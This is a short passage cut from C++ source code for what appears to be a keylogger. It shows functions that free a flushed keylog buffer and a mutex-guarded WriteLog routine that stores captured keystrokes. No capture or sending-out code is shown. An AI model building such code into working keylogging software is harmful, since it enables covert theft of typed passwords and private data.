	}

	return newBuffer;
}

void FreeFlushKeylogBufferResult(char* data) {
	if (data) free(data);
}

void WriteLog(char* key, int length) {
	std::lock_guard<std::mutex> guard(m);
	if (i + length > KEYLOG_BUFFER_SIZE) return;

	if (length > 0) {
